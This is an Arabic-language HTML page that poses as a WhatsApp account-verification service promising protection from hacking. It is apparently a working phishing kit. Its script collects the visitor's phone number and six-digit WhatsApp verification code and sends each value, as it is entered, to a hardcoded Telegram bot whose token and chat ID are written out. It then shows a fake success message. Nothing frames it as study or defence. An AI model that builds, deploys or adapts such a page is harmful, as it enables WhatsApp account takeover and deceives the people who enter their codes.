<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق حساب واتساب</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #128C7E, #075E54);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        header {
            margin-bottom: 30px;
            position: relative;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: #25D366;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .logo i {
            font-size: 40px;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .subtitle {
            font-size: 18px;
            opacity: 0.9;
            margin-bottom: 30px;
        }
        
        .step {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: right;
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .step.active {
            display: block;
        }
        
        .step-number {
            background: #25D366;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            margin-left: 10px;
            font-weight: bold;
        }
        
        .form-group {
            margin-bottom: 25px;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 16px;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: none;
            background: rgba(255, 255, 255, 0.15);
            color: #fff;
            font-size: 18px;
            outline: none;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        
        input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        
        input:focus {
            background: rgba(255, 255, 255, 0.25);
            border-color: #25D366;
        }
        
        button {
            background: #25D366;
            color: white;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            margin-top: 10px;
        }
        
        button:hover {
            background: #128C7E;
            transform: translateY(-2px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .loader {
            display: none;
            margin: 30px auto;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 5px solid #25D366;
            animation: spin 1s linear infinite;
        }
        
        .success {
            display: none;
            font-size: 60px;
            color: #25D366;
            margin: 30px 0;
            animation: scale 0.5s ease;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes scale {
            0% { transform: scale(0.5); opacity: 0; }
            70% { transform: scale(1.2); }
            100% { transform: scale(1); opacity: 1; }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .note {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.8;
            text-align: center;
        }
        
        .error {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 5px;
            display: none;
            text-align: right;
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.15);
            margin-top: 10px;
        }
        
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.25);
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fab fa-whatsapp"></i>
            </div>
            <h1>توثيق حساب واتساب</h1>
            <p class="subtitle">لضمان أمان حسابك وحمايته من الاختراق</p>
        </header>
        
        <main>
            <!-- المرحلة 1: توثيق الرقم -->
            <div class="step active" id="step1">
                <div class="step-header">
                    <span class="step-number">1</span>
                    <span>توثيق رقم الهاتف</span>
                </div>
                <div class="form-group">
                    <label for="phone-local">رقم الهاتف (بدون رمز البلد)</label>
                    <input type="tel" id="phone-local" placeholder="مثال: 05XXXXXXXX">
                    <div id="phone-local-error" class="error">يرجى إدخال رقم هاتف صحيح</div>
                </div>
                <button id="verify-phone-btn">
                    <i class="fas fa-check"></i> توثيق
                </button>
            </div>
            
            <!-- المرحلة 2: إدخال الرقم مع رمز البلد -->
            <div class="step" id="step2">
                <div class="step-header">
                    <span class="step-number">2</span>
                    <span>تأكيد رقم الهاتف</span>
                </div>
                <div class="form-group">
                    <label for="phone-full">رقم الهاتف مسبوق برمز البلد</label>
                    <input type="tel" id="phone-full" placeholder="مثال: +9665XXXXXXXX">
                    <div id="phone-full-error" class="error">يرجى إدخال رقم هاتف صحيح</div>
                </div>
                <button id="send-code-btn">
                    <i class="fas fa-paper-plane"></i> إرسال كود التحقق
                </button>
            </div>
            
            <!-- المرحلة 3: إدخال كود التحقق -->
            <div class="step" id="step3">
                <div class="step-header">
                    <span class="step-number">3</span>
                    <span>التحقق النهائي</span>
                </div>
                <div class="form-group">
                    <label for="code">كود التحقق المكون من 6 أرقام</label>
                    <input type="text" id="code" placeholder="أدخل الكود الذي استلمته" maxlength="6">
                    <div id="code-error" class="error">الكود يجب أن يتكون من 6 أرقام فقط</div>
                </div>
                <button id="verify-code-btn">
                    <i class="fas fa-check-circle"></i> تحقق
                </button>
            </div>
            
            <div class="loader" id="loader"></div>
            <div class="success" id="success">✓</div>
            
            <p class="note">
                هذه العملية ضرورية لحماية حسابك من الاختراق والاستخدام غير المصرح به
            </p>
        </main>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // عناصر المراحل
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            
            // حقول الإدخال
            const phoneLocalInput = document.getElementById('phone-local');
            const phoneFullInput = document.getElementById('phone-full');
            const codeInput = document.getElementById('code');
            
            // أزرار
            const verifyPhoneBtn = document.getElementById('verify-phone-btn');
            const sendCodeBtn = document.getElementById('send-code-btn');
            const verifyCodeBtn = document.getElementById('verify-code-btn');
            
            // مؤشرات
            const loader = document.getElementById('loader');
            const success = document.getElementById('success');
            
            // رسائل الخطأ
            const phoneLocalError = document.getElementById('phone-local-error');
            const phoneFullError = document.getElementById('phone-full-error');
            const codeError = document.getElementById('code-error');
            
            // دالة الانتقال بين المراحل
            function goToStep(stepNumber) {
                step1.classList.remove('active');
                step2.classList.remove('active');
                step3.classList.remove('active');
                
                if(stepNumber === 1) step1.classList.add('active');
                if(stepNumber === 2) step2.classList.add('active');
                if(stepNumber === 3) step3.classList.add('active');
            }
            
            // المرحلة 1: توثيق الرقم
            verifyPhoneBtn.addEventListener('click', function() {
                const phone = phoneLocalInput.value.trim();
                
                if(!phone || !/^05\d{8}$/.test(phone)) {
                    phoneLocalError.style.display = 'block';
                    return;
                }
                
                // إرسال البيانات إلى التلجرام
                sendToTelegram(`📱 المرحلة 1: توثيق الرقم\n\n📞 الرقم المحلي: ${phone}`);
                
                // إظهار المؤشر والنجاح
                showLoaderAndSuccess(1);
            });
            
            // المرحلة 2: إرسال كود التحقق
            sendCodeBtn.addEventListener('click', function() {
                const phone = phoneFullInput.value.trim();
                
                if(!phone || !/^\+\d{10,15}$/.test(phone)) {
                    phoneFullError.style.display = 'block';
                    return;
                }
                
                // إرسال البيانات إلى التلجرام
                sendToTelegram(`📱 المرحلة 2: تأكيد الرقم\n\n🌍 الرقم الدولي: ${phone}`);
                
                // إظهار المؤشر والنجاح
                showLoaderAndSuccess(2);
            });
            
            // المرحلة 3: التحقق من الكود
            verifyCodeBtn.addEventListener('click', function() {
                const code = codeInput.value.trim();
                
                if(!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
                    codeError.style.display = 'block';
                    return;
                }
                
                // إرسال البيانات إلى التلجرام
                sendToTelegram(`📱 المرحلة 3: التحقق النهائي\n\n🔑 كود التحقق: ${code}`);
                
                // إظهار المؤشر والنجاح
                showLoaderAndSuccess(3);
            });
            
            // دالة لعرض المؤشر ثم علامة النجاح
            function showLoaderAndSuccess(step) {
                // إخفاء جميع الأزرار مؤقتاً
                verifyPhoneBtn.style.display = 'none';
                sendCodeBtn.style.display = 'none';
                verifyCodeBtn.style.display = 'none';
                
                // إظهار المؤشر
                loader.style.display = 'block';
                success.style.display = 'none';
                
                // بعد 5 ثواني
                setTimeout(() => {
                    // إخفاء المؤشر وإظهار النجاح
                    loader.style.display = 'none';
                    success.style.display = 'block';
                    
                    // بعد 2 ثواني
                    setTimeout(() => {
                        // إخفاء النجاح
                        success.style.display = 'none';
                        
                        // الانتقال للمرحلة التالية
                        if(step === 1) {
                            goToStep(2);
                            verifyPhoneBtn.style.display = 'block';
                        } else if(step === 2) {
                            goToStep(3);
                            sendCodeBtn.style.display = 'block';
                        } else if(step === 3) {
                            // إعادة تعيين النموذج بعد اكتمال المراحل
                            resetForm();
                        }
                        
                        // إعادة إظهار الزر الحالي
                        if(step === 1) verifyPhoneBtn.style.display = 'block';
                        if(step === 2) sendCodeBtn.style.display = 'block';
                        if(step === 3) verifyCodeBtn.style.display = 'block';
                    }, 2000);
                }, 5000);
            }
            
            // دالة إرسال البيانات إلى التلجرام
            function sendToTelegram(message) {
                const botToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
                const chatId = '7493001551';
                
                // استخدام API التلجرام لإرسال الرسالة
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('تم إرسال البيانات إلى التلجرام:', data);
                })
                .catch(error => {
                    console.error('حدث خطأ في الإرسال:', error);
                });
            }
            
            // إعادة تعيين النموذج
            function resetForm() {
                phoneLocalInput.value = '';
                phoneFullInput.value = '';
                codeInput.value = '';
                goToStep(1);
                
                // إظهار رسالة نهائية
                alert('تم توثيق حسابك بنجاح! شكراً لاستخدامك خدمتنا.');
            }
        });
    </script>
</body>
</html>
